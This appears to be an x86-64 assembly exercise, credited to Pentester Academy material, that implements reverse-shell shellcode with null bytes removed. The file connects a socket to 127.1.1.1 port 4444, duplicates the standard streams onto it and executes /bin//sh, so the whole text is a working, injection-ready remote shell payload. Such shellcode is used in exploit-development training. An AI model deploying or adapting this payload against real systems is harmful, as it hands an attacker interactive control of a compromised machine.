# This is the original code provided by pentester academy modified to remove null bytes
global _start

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41
	;mov rax, 41
	;mov rdi, 2
	;mov rsi, 1
	;mov rdx, 0

	xor rax, rax                             ; Clear rax register
	mov rdi, rax                             ; Clear rdi register
	mov rsi, rax                             ; Clear rsi register
	mov rdx, rax                             ; Clear rdx register

	mov al, 41                               ; Move only a word
	mov dil, 2                               ; Move only a word
	mov sil, 1                               ; Move only a word
	syscall

	; copy socket descriptor to rdi for future use
	mov rdi, rax

	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)
	xor rax, rax
	push rax
	mov dword [rsp-4], 0x0101017f            ; Change lookup address: 127.0.0.1 -> 127.1.1.1
	mov word [rsp-6], 0x5c11

	;mov word [rsp-8], 0x2
	mov word [rsp-8], ax                     ; Set word to 0x0000
	add byte [rsp-8], 0x2                    ; Add byte 0x02 -> 0x0002

	sub rsp, 8

	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	xor rax, rax                             ; Clear rax register
	mov rdx, rax                             ; Clear rdx register
;	mov rax, 42
	mov rsi, rsp
;	mov rdx, 16
	mov al, 42                               ; Move only a word
	mov dl, 16                               ; Move only a word

	syscall

; duplicate sockets
; dup2 (new, old)
;mov rax, 33
;mov rsi, 0
xor rax, rax                             ; Clear rax register
mov rsi, rax                             ; Set rsi to 0
mov al, 33                               ; Move only a word
syscall

;mov rax, 33
;mov rsi, 1
xor rax, rax                             ; Clear rax register
mov rsi, rax                             ; Clear rsi register
mov al, 33                               ; Move only a word
inc rsi                                  ; Set rsi to 1
syscall

;mov rax, 33
;mov rsi, 2
xor rax, rax                             ; Clear rax register
mov rsi, rax                             ; Clear rax register
mov al, 33                               ; Move only a word
mov sil, 2                               ; Set rsi to 2
syscall

  ; execve
  ; First NULL push
  xor rax, rax
  push rax

  ; push /bin//sh in reverse
  mov rbx, 0x68732f2f6e69622f
  push rbx

  ; store /bin//sh address in RDI
  mov rdi, rsp

  ; Second NULL push
  push rax

  ; set RDX
  mov rdx, rsp

  ; Push address of /bin//sh
  push rdi

  ; set RSI
  mov rsi, rsp

  ; Call the Execve syscall
  add rax, 59
  syscall
